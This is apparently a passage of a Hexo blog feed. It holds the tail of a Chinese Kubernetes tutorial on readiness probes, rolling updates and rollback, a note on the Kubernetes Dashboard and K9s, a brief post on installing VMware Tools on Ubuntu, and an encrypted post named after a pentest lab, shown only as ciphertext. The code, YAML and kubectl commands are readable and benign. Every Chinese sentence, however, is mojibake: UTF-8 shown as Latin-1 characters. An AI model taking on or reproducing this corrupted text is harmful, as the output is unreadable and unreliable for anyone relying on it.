å°šæœªå°±ç»ªï¼Œä¼šè¢«ä» Service çš„è´Ÿè½½å‡è¡¡å™¨ä¸­å‰”é™¤ã€‚â€“ <a href="https://kubernetes.io/docs/tasks/configure-pod-container/configure-liveness-readiness-startup-probes/">ReadinessProb</a></p></blockquote><p>åœ¨ç”Ÿäº§ç¯å¢ƒä¸­ï¼Œå‡çº§æœåŠ¡çš„ç‰ˆæœ¬æ˜¯æ—¥å¸¸çš„éœ€æ±‚ï¼Œè¿™æ—¶æˆ‘ä»¬éœ€è¦è€ƒè™‘ä¸€ç§åœºæ™¯ï¼Œå³å½“å‘å¸ƒçš„ç‰ˆæœ¬å­˜åœ¨é—®é¢˜ï¼Œå°±ä¸åº”è¯¥è®©å®ƒå‡çº§æˆåŠŸã€‚kubelet ä½¿ç”¨å°±ç»ªæ¢æµ‹å™¨å¯ä»¥çŸ¥é“å®¹å™¨ä½•æ—¶å‡†å¤‡å¥½æ¥å—è¯·æ±‚æµé‡ï¼Œå½“ä¸€ä¸ª pod å‡çº§åä¸èƒ½å°±ç»ªï¼Œå³ä¸åº”è¯¥è®©æµé‡è¿›å…¥è¯¥ podï¼Œåœ¨é…åˆ <code>rollingUpate</code> çš„åŠŸèƒ½ä¸‹ï¼Œä¹Ÿä¸èƒ½å…è®¸å‡çº§ç‰ˆæœ¬ç»§ç»­ä¸‹å»ï¼Œå¦åˆ™æœåŠ¡ä¼šå‡ºç°å…¨éƒ¨å‡çº§å®Œæˆï¼Œå¯¼è‡´æ‰€æœ‰æœåŠ¡å‡ä¸å¯ç”¨çš„æƒ…å†µã€‚</p><p>è¿™é‡Œæˆ‘ä»¬æŠŠæœåŠ¡å›æ»šåˆ° <code>hellok8s:v2</code> çš„ç‰ˆæœ¬ï¼Œå¯ä»¥é€šè¿‡ä¸Šé¢å­¦ä¹ çš„æ–¹æ³•è¿›è¡Œå›æ»šã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">kubectl rollout undo deployment hellok8s-deployment --to-revision=2<br></code></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘ä»¬å°†åº”ç”¨çš„ <code>/healthz</code> æ¥å£ç›´æ¥è®¾ç½®æˆè¿”å› 500 çŠ¶æ€ç ï¼Œä»£è¡¨è¯¥ç‰ˆæœ¬æ˜¯ä¸€ä¸ªæœ‰é—®é¢˜çš„ç‰ˆæœ¬ã€‚</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;io&quot;</span><br><span class="hljs-string">&quot;net/http&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">hello</span><span class="hljs-params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;<br>io.WriteString(w, <span class="hljs-string">&quot;[v2] Hello, Kubernetes!&quot;</span>)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>http.HandleFunc(<span class="hljs-string">&quot;/healthz&quot;</span>, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;<br>w.WriteHeader(<span class="hljs-number">500</span>)<br>&#125;)<br><br>http.HandleFunc(<span class="hljs-string">&quot;/&quot;</span>, hello)<br>http.ListenAndServe(<span class="hljs-string">&quot;:3000&quot;</span>, <span class="hljs-literal">nil</span>)<br>&#125;<br></code></pre></td></tr></table></figure><p>åœ¨ <code>build</code> é˜¶æ®µæˆ‘ä»¬å°† <code>tag</code> è®¾ç½®ä¸º <code>bad</code>ï¼Œæ‰“åŒ…å push åˆ°è¿œç¨‹ä»“åº“ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker build . -t guangzhengli/hellok8s:bad<br><br>docker push guangzhengli/hellok8s:bad<br></code></pre></td></tr></table></figure><p>æ¥ç€ç¼–å†™ deployment èµ„æºæ–‡ä»¶ï¼Œ<a href="https://kubernetes.io/docs/reference/generated/kubernetes-api/v1.25/#probe-v1-core">Probe</a> æœ‰å¾ˆå¤šé…ç½®å­—æ®µï¼Œå¯ä»¥ä½¿ç”¨è¿™äº›å­—æ®µç²¾ç¡®åœ°æ§åˆ¶å°±ç»ªæ£€æµ‹çš„è¡Œä¸ºï¼š</p><ul><li><code>initialDelaySeconds</code>ï¼šå®¹å™¨å¯åŠ¨åè¦ç­‰å¾…å¤šå°‘ç§’åæ‰å¯åŠ¨å­˜æ´»å’Œå°±ç»ªæ¢æµ‹å™¨ï¼Œ é»˜è®¤æ˜¯ 0 ç§’ï¼Œæœ€å°å€¼æ˜¯ 0ã€‚</li><li><code>periodSeconds</code>ï¼šæ‰§è¡Œæ¢æµ‹çš„æ—¶é—´é—´éš”ï¼ˆå•ä½æ˜¯ç§’ï¼‰ã€‚é»˜è®¤æ˜¯ 10 ç§’ã€‚æœ€å°å€¼æ˜¯ 1ã€‚</li><li><code>timeoutSeconds</code>ï¼šæ¢æµ‹çš„è¶…æ—¶åç­‰å¾…å¤šå°‘ç§’ã€‚é»˜è®¤å€¼æ˜¯ 1 ç§’ã€‚æœ€å°å€¼æ˜¯ 1ã€‚</li><li><code>successThreshold</code>ï¼šæ¢æµ‹å™¨åœ¨å¤±è´¥åï¼Œè¢«è§†ä¸ºæˆåŠŸçš„æœ€å°è¿ç»­æˆåŠŸæ•°ã€‚é»˜è®¤å€¼æ˜¯ 1ã€‚ å­˜æ´»å’Œå¯åŠ¨æ¢æµ‹çš„è¿™ä¸ªå€¼å¿…é¡»æ˜¯ 1ã€‚æœ€å°å€¼æ˜¯ 1ã€‚</li><li><code>failureThreshold</code>ï¼šå½“æ¢æµ‹å¤±è´¥æ—¶ï¼ŒKubernetes çš„é‡è¯•æ¬¡æ•°ã€‚ å¯¹å­˜æ´»æ¢æµ‹è€Œè¨€ï¼Œæ”¾å¼ƒå°±æ„å‘³ç€é‡æ–°å¯åŠ¨å®¹å™¨ã€‚ å¯¹å°±ç»ªæ¢æµ‹è€Œè¨€ï¼Œæ”¾å¼ƒæ„å‘³ç€ Pod ä¼šè¢«æ‰“ä¸Šæœªå°±ç»ªçš„æ ‡ç­¾ã€‚é»˜è®¤å€¼æ˜¯ 3ã€‚æœ€å°å€¼æ˜¯ 1ã€‚</li></ul><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">apps/v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Deployment</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">hellok8s-deployment</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">strategy:</span><br>     <span class="hljs-attr">rollingUpdate:</span><br>      <span class="hljs-attr">maxSurge:</span> <span class="hljs-number">1</span><br>      <span class="hljs-attr">maxUnavailable:</span> <span class="hljs-number">1</span><br>  <span class="hljs-attr">replicas:</span> <span class="hljs-number">3</span><br>  <span class="hljs-attr">selector:</span><br>    <span class="hljs-attr">matchLabels:</span><br>      <span class="hljs-attr">app:</span> <span class="hljs-string">hellok8s</span><br>  <span class="hljs-attr">template:</span><br>    <span class="hljs-attr">metadata:</span><br>      <span class="hljs-attr">labels:</span><br>        <span class="hljs-attr">app:</span> <span class="hljs-string">hellok8s</span><br>    <span class="hljs-attr">spec:</span><br>      <span class="hljs-attr">containers:</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-attr">image:</span> <span class="hljs-string">guangzhengli/hellok8s:bad</span><br>          <span class="hljs-attr">name:</span> <span class="hljs-string">hellok8s-container</span><br>          <span class="hljs-attr">readinessProbe:</span><br>            <span class="hljs-attr">httpGet:</span><br>              <span class="hljs-attr">path:</span> <span class="hljs-string">/healthz</span><br>              <span class="hljs-attr">port:</span> <span class="hljs-number">3000</span><br>            <span class="hljs-attr">initialDelaySeconds:</span> <span class="hljs-number">1</span><br>            <span class="hljs-attr">successThreshold:</span> <span class="hljs-number">5</span><br></code></pre></td></tr></table></figure><p>é€šè¿‡ <code>get</code> å‘½ä»¤å¯ä»¥å‘ç°ä¸¤ä¸ª pod ä¸€ç›´å¤„äºè¿˜æ²¡æœ‰ Ready çš„çŠ¶æ€å½“ä¸­ï¼Œé€šè¿‡ <code>describe</code> å‘½ä»¤å¯ä»¥çœ‹åˆ°æ˜¯å› ä¸º <code>Readiness probe failed: HTTP probe failed with statuscode: 500</code> çš„åŸå› ã€‚åˆå› ä¸ºè®¾ç½®äº†æœ€å°ä¸å¯ç”¨çš„æœåŠ¡æ•°é‡ä¸º<code>maxUnavailable=1</code>ï¼Œè¿™æ ·èƒ½ä¿è¯å‰©ä¸‹ä¸¤ä¸ª <code>v2</code> ç‰ˆæœ¬çš„ <code>hellok8s</code> èƒ½ç»§ç»­æä¾›æœåŠ¡ï¼</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs shell">kubectl apply -f deployment.yaml<br><br>kubectl get pods                <br><span class="hljs-meta prompt_"># </span><span class="language-bash">NAME                                   READY   STATUS    RESTARTS   AGE</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">hellok8s-deployment-66799848c4-8xzsz   1/1     Running   0          102s</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">hellok8s-deployment-66799848c4-m9dl5   1/1     Running   0          102s</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">hellok8s-deployment-9c57c7f56-rww7k    0/1     Running   0          26s</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">hellok8s-deployment-9c57c7f56-xt9tw    0/1     Running   0          26s</span><br><br><br>kubectl describe pod hellok8s-deployment-9c57c7f56-rww7k<br><span class="hljs-meta prompt_"># </span><span class="language-bash">Events:</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">  Type     Reason     Age                From               Message</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">  ----     ------     ----               ----               -------</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">  Normal   Scheduled  74s                default-scheduler  Successfully assigned default/hellok8s-deployment-9c57c7f56-rww7k to minikube</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">  Normal   Pulled     73s                kubelet            Container image <span class="hljs-string">&quot;guangzhengli/hellok8s:bad&quot;</span> already present on machine</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">  Normal   Created    73s                kubelet            Created container hellok8s-container</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">  Normal   Started    73s                kubelet            Started container hellok8s-container</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">  Warning  Unhealthy  0s (x10 over 72s)  kubelet            Readiness probe failed: HTTP probe fa</span><br></code></pre></td></tr></table></figure><h1 id="Dashboard"><a href="#Dashboard" class="headerlink" title="Dashboard"></a>Dashboard</h1><p>2025å¹´4æœˆ11æ—¥ Â· 251 å­—</p><h2 id="kubernetes-dashboard"><a href="#kubernetes-dashboard" class="headerlink" title="kubernetes dashboard"></a>kubernetes dashboard</h2><blockquote><p>Dashboard æ˜¯åŸºäºç½‘é¡µçš„ Kubernetes ç”¨æˆ·ç•Œé¢ã€‚ ä½ å¯ä»¥ä½¿ç”¨ Dashboard å°†å®¹å™¨åº”ç”¨éƒ¨ç½²åˆ° Kubernetes é›†ç¾¤ä¸­ï¼Œä¹Ÿå¯ä»¥å¯¹å®¹å™¨åº”ç”¨æ’é”™ï¼Œè¿˜èƒ½ç®¡ç†é›†ç¾¤èµ„æºã€‚ ä½ å¯ä»¥ä½¿ç”¨ Dashboard è·å–è¿è¡Œåœ¨é›†ç¾¤ä¸­çš„åº”ç”¨çš„æ¦‚è§ˆä¿¡æ¯ï¼Œä¹Ÿå¯ä»¥åˆ›å»ºæˆ–è€…ä¿®æ”¹ Kubernetes èµ„æº ï¼ˆå¦‚ Deploymentï¼ŒJobï¼ŒDaemonSet ç­‰ç­‰ï¼‰ã€‚ ä¾‹å¦‚ï¼Œä½ å¯ä»¥å¯¹ Deployment å®ç°å¼¹æ€§ä¼¸ç¼©ã€å‘èµ·æ»šåŠ¨å‡çº§ã€é‡å¯ Pod æˆ–è€…ä½¿ç”¨å‘å¯¼åˆ›å»ºæ–°çš„åº”ç”¨ã€‚</p></blockquote><p>åœ¨æœ¬åœ° minikube ç¯å¢ƒï¼Œå¯ä»¥ç›´æ¥é€šè¿‡ä¸‹é¢å‘½ä»¤å¼€å¯ Dashboardã€‚æ›´å¤šç”¨æ³•å¯ä»¥å‚è€ƒå®˜ç½‘æˆ–è€…è‡ªè¡Œæ¢ç´¢ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">minikube dashboard<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/guangzhengli/PicURL@master/uPic/eB3MYd.png" alt="eB3MYd"></p><h2 id="K9s"><a href="#K9s" class="headerlink" title="K9s"></a>K9s</h2><p><a href="https://k9scli.io/">K9s</a> æ˜¯ä¸€ä¸ªåŸºäº Terminal çš„è½»é‡çº§ UIï¼Œå¯ä»¥æ›´åŠ è½»æ¾çš„è§‚å¯Ÿå’Œç®¡ç†å·²éƒ¨ç½²çš„ k8s èµ„æºã€‚ä½¿ç”¨æ–¹å¼éå¸¸ç®€å•ï¼Œå®‰è£…åè¾“å…¥ <code>k9s</code> å³å¯å¼€å¯ Terminal Dashboardï¼Œæ›´å¤šç”¨æ³•å¯ä»¥å‚è€ƒå®˜ç½‘ã€‚</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/83ybd4.png" alt="83ybd4"></p><p>refer</p><ul><li><a href="https://minikube.sigs.k8s.io/docs/">minikube</a></li><li><a href="https://guangzhengli.com/courses">k8sæ•™ç¨‹</a></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>k8s</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vmtoolså®‰è£…</title>
    <link href="/2025/04/26/vmtools%E5%AE%89%E8%A3%85/"/>
    <url>/2025/04/26/vmtools%E5%AE%89%E8%A3%85/</url>
    
    <content type="html"><![CDATA[<h2 id="åœ¨Ubuntuä¸Šå®‰è£…VMware-Tools"><a href="#åœ¨Ubuntuä¸Šå®‰è£…VMware-Tools" class="headerlink" title="åœ¨Ubuntuä¸Šå®‰è£…VMware Tools"></a>åœ¨Ubuntuä¸Šå®‰è£…VMware Tools</h2><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs vim">sudo apt-<span class="hljs-built_in">get</span> <span class="hljs-keyword">update</span><br><br>sudo apt-<span class="hljs-built_in">get</span> install <span class="hljs-keyword">open</span>-<span class="hljs-keyword">vm</span>-tools <span class="hljs-keyword">open</span>-<span class="hljs-keyword">vm</span>-tools-desktop<br><br>sudo reboot<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>çŸ¥è¯†ç‚¹</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vmtoolså®‰è£…</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>æ˜¥ç§‹äº‘é•œ-Hospital</title>
    <link href="/2025/04/19/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Hospital/"/>
    <url>/2025/04/19/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Hospital/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="å¯†ç é”™è¯¯ï¼Œè¯·é‡è¯•ã€‚" data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="f8fa2e1389a165b08492ae7d4430e814569dc8e671ef465d23ec25db48749c52">7389a4e37e9dabc8af72228f567f583bb5a45bd0f3a6f097aaa03e2b7f93f5d075cc08a341683d92bc2416edd5a27873732870005f5e4a6de1488cea555f7ae42e92f0e1d2ecc1e5b9bd0101b9a15fae9e672a86de2d23f6987c2041e92565d97e1a2fc6b693e8461a710cdc31e4542670c2e72a875e1d54a59ff7ce86b972a99e45730eacd2c9bac981d5da5a4520a0651dd0dda1c7d614e289f2af49e6a52bfbf3a17328d3f9396c1f4684e549e07be6eae44b250f381207eb66a1f27c912c7bd20bc5622e7f3ae56ca62133557ddf155651e2144cbe391fe3bc1cba1d4ecf7b418bb504dc358fe412ed08a29e8e20e50fd56e5772d0eb81b252735d45bd637caf22d662c50aa8a0b5b9c93e36dd7f017d072c50ad194596c27f91816c78919caf67f1dd3e028051e61c16fda07b49d9665922ade4343b5442578ba8b43e143bb8ce4ece38bf958d0d353d626f674a07ef4c7b313d4f675a4025751c7a0b4dec2088d78e540e009f32cb8240a119019ada67dd11b84e23ced62436793337a8e6486d9240642937084f5c3097a46f28feb6a2e6891913043032821f1c14876bb7fb396a5e3a0021a32849d30891b5940bca1b18438ae62185c7e19ee708fff38d18360d4226e0b98bba4d98afc1cffb9f5602731d4a42bf188aa35accd2694fc33bf13c99b0a5ac24f43b7eb146564af7adf8b5a3390b5e9322f47aeb220e67afd01b7ccb56dc3eb2a2466e35e80361d44c7e2a91921b39e381c70241f963e1eafec6a3bdbff77eadf60b0fdf8a3946f1ca458ecda2a07a25ff3c41325b1de8cbdc19d4239540b768fa58b11c026e648a67bed28bc59dc8a4a7ef9fd2891043792eab2ce175e17815bad891efcc5cb317cbb595be9d7a860240ae7feb3d82dca62c8465b7eb6629283ea559f51f6e35c0f2fdcec406eba4246e1ccf1ff1ccb26ea9f10d519a29747095a12c7e468890d989d7eeb7d47cbadcc84480cdbfc8ffa9d0bbbf873826ac25ab9bd6271599b3a52e385f30db0d1fed210bbb88e80a9cf522f4b2843a5aba1d7e1c229372abd3fe91ac954e822f27aa152e0f95a54aa850f6418ba5835b29f6fc2e897fa3ad82800114bd129b24db495d4ee61a2e8105469cacec9a69b90de374895c45401f2a4e302cb421e9c6ff62504e91bb4955ed7d7b169cc587134131e782e656943a753a95a065d9fefeb882bd960a9e0a6e99c7bb8d3374ce72fa7c758bab8eca49e9c7173da6aff9ca7a327f0f76adafb6e6e6ccb119c9bee08ddaa652bba30d6271acff4cceba78d1f201bbae0b461fbf22acb07f67f8247155ba1c1be3cf78022654eda76bfc745d3b80fa2d0c3cf2f102d53ab7b249ccd8ce448384502a12d8773d936e9445bec29b47ccbc2522ef299786ce58f94a05f18d4ccb4677a51bbc4ac9eb7f642f7eb9d5fa9a4affd67657151a480320fd3a45dc87e5e80eb4b2083123b85de30c8b9b62c1c181ad12c81c8aa4ecd69cecd34b4ff408de631630c2ca49e6488d231a6e4cd53c933453b0cd7bb4a8adcfe8e17f1936236f3b4d521baa6b8df72f19262781429e200c7460dc91d5d5eb3b3ee19efdc01e057902dd2ee320e541528ec8767b5a58ffeee7abe38b912e50ba8191a4f30e5bd87ea33d8471a40a9ade703fce25a876674dba8102ca37400d1e210458240f28b034540336af9485f9499dde15092bed4e3126878b0f6186db0c734cfd9808ba55d4f40ea9ae69760dfb182180f1991a7eaaafd35bdf5c4803a65e8d30ddd117fd759194d3ca4d6bf4e9127e95f77f58dded8ecbb499622c9c41f57de9a6bc6de7470bd7a8053537a06211b3810253a8ac68ce956be01a047d37a911c23a46678eb1347b3d73df26d94c8413f84c1a8a3f9cfb8bd9536d6bbdf35408316452d28c9ba1e4d5967aff09d23b1edf939b5a5a986a834b09ef5ea2d569b5e1f613c923a3429679f6965b5e9c3c4ab7b3b8cd9daa39b15acd56a0740800a91bc67df25a649cf79893163448d7a82985482a6bc4face236cb47a5385e9aa621eda666ccc5054e3a0ec222edf26f012fdd6ba1896c2fb04f3c50bfbbfe7498b5b4eb811473e23b155003769d9fd02bb933c9a1d98c509a23f99dbc5dba7cca11dfd225188540255e320d079b313f38e5a7d5eb42979f59f564285bf6c344c19050e97ac67eb88404f7ac55698d50c771bbfc3b40e875652c804286a17aa2bc818161e8e1b369e64ddf8c60b637cb25ecf45a159e35c2a6bf96bc94559313f6203e844c9f2c9ca3001dc128dddccda22f5715ebcf0b02d17af5c49cdcc34573a8846ec245cce7cf9c898b89283ca3ede96f5e193e6b98287f47775d0e866190aa34ef0768e1f08f2e226adfa003173c232a5eceb9a6c0f2f71ed811f78a4f0e10112a7001ca9f0e58da1a0ec6d5a7c8a06f1e6a51d83197feedc26b5fbeec8882646b986e085b47aa3fec5c2a06f34c4c504a6c1a6a8f5c9461750826867d778f51293f6ffeafebb8c1ce710df6e46bff2493655cf669af8e7c8113e2edad0bcd4bb2026a91120734fea69a15647a3ef136b69c09b657733bd27b6ca9b186cfce927619159e0f31d319467d16083cae89f2678942bc593a15f0ed34fc7b46d85f852cf407b47ee6dcc2ebb8027ca91131d3c9645760354824fa90f1d80826c6c8455d5e6e855837e2d837313b1e111f31ea62d86da2121206687cd5754e7bad359f7fcd32a2a4aec81770c3ceae33920136f2160df359d92c0ea589cdfddc2338327d880b405354ecd848857bcb5bdc8465c10f01ec3cce5efddf86396fa1123cd511a2a615443899d3fb3fa3e2dc119919e5d927cc7d9d80bf968031460d7e0fa83acd77953bd5a1f3805b29b55acceabe6608d4f253dc5d2c758e5f466bf7002a1fd61babcf6e2c81fad3dcbde85d0b6ff81912e4a53e5302b8bfe24df65bb38be8d5cc03bbeb877f6d2636e15186742d495ead6d19b8a60af671e3a7a760e5e34ecbcf1c2dafd109e757e6cb1a05d8c6737a983df618a1d51efcf7dfff93facb820f9f0fc6296ffee48099da4d21e20d95adf9830871539c0a8c85c9c60057128d6440a40121108402e6a2c81d3a3c67f6e01b77e2dd2e9ef33f29192fd775d4827561c713220e40273b5e6f0abfba69395e55dbf6deeb9353b99161f21810e994d604a52fd59365abf1fd913e90dc8c52c3af66fed359c7997773e93b895057840ead354b215d5af111b5fc65e84bc2c88782f2f7232c00b08c3d63253c87ee3b4744ecd6faec0c7f2c2b83685fbc98b318c9a9de5c33d39747dd15df6350aba1652f0ee930c678bad79bef6559a5cc0fc1719b98b9caa5bb07b70d3ba335010b4eacc82fcd4d54a5b04ccefb19c802320601f7973f4e3af94d43728f34d54bb70c723294425a51b6fdfcd24d219067fa7b3c5ef2768c15787a04625da32276228d7f23f0b307c903b5562b02026a877c6aa52cb4d74630bff3396710393879663161d55f39e89aaa4ab7c9bd606bd4ca6eb0ccd299a37f4bca3d1fd84aa2b1e5c771df97963b376ea4b5870fd4ded334ef9ed6174bbb265f96844b546daf1f9681d948a08e5ca35e87f92edad985fd8d084550cdc58021deb46a69e25959d0729fadfa88b0d23417f6fda1738ab3580ce4cc117292232e3b689e0b1b54e5acd2565974790afcb4d8985a5050adfa9f34331c6c9698ca2e6a186f5e687364b26cb9e04a36b7a63094b77cb174be128c5183e187e0da7b126ddc09b4a9556ece8b5dbc9d0bc65175608fddbb00d280365134d7c67fcb4d74bb3a5b24d573c0c6f9726ebaa483d54d4fad6c9afee71e15b51559b77d8e2cf0575b95adaaaa63097d21c12493d4cf32e886790f3dffb65e616a42b29af1b1418ad06c14df1b13946d41d421029dc1556d8b2fecbdab47fc8c5a492d87bd36051b2638e483b21954f4245905e6cfc6639d6053b192235f7fdef4cfa6b99d44cbfe49c229f9d04df07c43c62a5b86b5ab7cb6b9c006f853c2b4b758954b675e4ccdaefe4d6f6b991f6e374fbe7fa0be67aae93fbed403f82bd5d08160926b4ca0a88877033c1755431bb11070829a928c15b40b65a31432de63be9df6881b027fcf017448bb32a142f01aa7007e3f650d473dd752d94b9f01856f339798b87b6578a3796839ee2637785628c8c5628b848744863acce4081ef531a52dd45128022f453eb6ede997f2783e58e9fbc636ea0c4161eee54473a32f9193669ed7d56e2a347b569f5d9325fab53840f7c9ca763bdbf122dd05158b460839c38a0cabb19586b24844c88eb057d04aed1405f4c31dae2123d2abb5dfcb9dea76381d8e6b5d96ef1672192c153974ce8c98169473cde596515be7b39f7e4fe3e347076caf76e67ba7eebff3691ad92a29cd0b7b30bab4cbeb9be6467bc86778288dd0323ba037e2b735776a84a3cd3ab6087d36d6234aaff9a57f5ac6fde4783e1df089af19f1a81df71c6af4b88fd59b0480d2f62b6ada9b34f3f4db13484fe9f7c32de1d6fa9f3493dac17361f4fc7bde267c4c6c4b6d33baf4f60f8ca537b0b0d6bb1d57a68e3de684ab7329eb8a0432d42e3322f74c2917e3c0f7abdbb5c62433c85f509009c5d42242dae73fdcc884db61293a81e6637acd853e9211e6db91573eba485d04313ec5807f1b806d297ff7e608f848f66f8a7a45eed7b9784f2d756a48213a9bb02c3f24cffedea427bfbb4eb26068ecf05b6fe8076c86e97d2937b24796dfef65919871041076c1c153f2ae20fbf86d81354bf96a517cf5b9cd85087a90a32b25aab7ffed6f9f668088fac97d786d4cca5a114d01ae352ec0c3efdfbdff61442da6a5e7fb8f2a69df9f4faa055b352a97065ba339ab93d26eb2b686d3a1bff03062899d692812eca18715c693ddfdf1648309ecdd25c319c95ba900dc2190f988c6fbd04bcb6e53c8e4f12ad0a13770fefb36f5a11de3f79db1f893f341baa1f0732176d8d7197657e00a5262207b3d97d2f0fad5e409fff6238edb41e09e2e025c8f902bdddef476e86422b98bb8bea29d3cda0901dd511b0b097e80844457fc367daf7b37e15a0aecd8a05adbd6d5bd19e79d08a22c947e8eca4da6747e08e4e197f345273537efda2adc58164fe063896f1a194499fae5b9638781a52e4840a2c1598ba21799f6a03f7f000357ece36c3e0554c8f080356398fd1c358c71474a5f070746d60e7f73e0a466dc410f22e2a14bc4c50265f564d80eeee148f52b37e0764de0c67b3bf0b67fa8fe86c606e233d83fa1a429092782da18a709c7701f174e5664b9a62e52561fa2fb19f7882a774dd423620c389f73f18c9f44fa440c85adde39e2b7f1a236e9f22c540d5167294776302a14c65cfd3fc2f77989b84791450a17c3618068aa174c4e625d31f00a64d9613e05ced0240ecccefbe0b720208b364ef9ce2bfad4a99c76e0e78cf7ef19e3230677ec143bd1fe467d8d998bd5afff1ec925c6d487ff5cea45d806660a38e53b515f80fce9a03f480a75fc8f83d9bdeaa9601bbc0fd010ae8429d75050b965e11a46b7ac5285602466b5671b81904205e25359272a627dfa1b859be5bc0e45ac53c70404308b6782cccef9423529c032fcd7b323151696bdc5db20fc05f6cd15b11c456b9baf5fba95b29961b4c923ba297d311b4df435ce0cb0b664326f11f0fd95fbfc99cbe64cf3630d03211480bea601a7865e323107b28676b4a673c32c86f4124e2992cd4509547a13181d795581ac92c87fab9493b24ec9dc35988eda005caa67d4f4ad564b38ba6482c1c40308bba2ab4ad86e685bec1b3d5224b6ff55c1901f4e3463ede1c7680422bbe4fec24b3ded1268d849ce3efa1ae1012a9e6325d075d6130b838c1ea28070a7e44a925fbfb9640fc3f5c8ecbaea9cbaa6bb8c7d897290f0376384876f3dd2b6481c3b30a09caac596e025ab788b01ef7627c675fd844e95fe7080f356fc99a7b32e41bec3ded78e3ed2a479f6d441f8ad5721718cb66697d9289cc8c0472e1df57622c78421f47ae9743a38a4fd4662e9895846e85dd4bd4f2efb57638f2f8d9847a83b10cd9ff5ef29ecba25698b79e5a571a410251e7f84f4a938b7312dfe4b6337611714893731a18f844e3870970a6a6d53627513237b9b81c4e4ba1592cf7d22b62798f5cb4efd7922336faccfc77c56f69ee690bb7319a5caacf855836e6afaf459323708cefd1bf0859c162f7bf9e1c180f00f5bf14dafd24ce0d61338c91a2e3daad7b2ae20528e3e050cd8838b81a26a0d24d9f7da1ad885a9c4cf12f6eaccb683549a46f0e395f620478db16d0ccd3ec81b7d0585040bf397536056c7af9a5b271f703693222da19371fc7de27d201cd2a77b04bea9b97fb781f55ccaf265e73eb229c7b869b8849c63d7eb7e926e03ec2a08c397426f84ec413981cbbc6423fd09a30dedfb74b4e680bf80c61254decb84b1274ed3aa6a032b24feeafe75b269602fd1f918b380e5cffcb481276e9f269201a71d5ce579f2fb1b08f2eeee499dad371f195c62f011ca0d7217e93381fee259b2ce779acae153cdc7ecc672533d2ba32c59a1f1508dad8ff0b20b53ea46e03519e9308edd3f2e8e17f8cd017bb3675a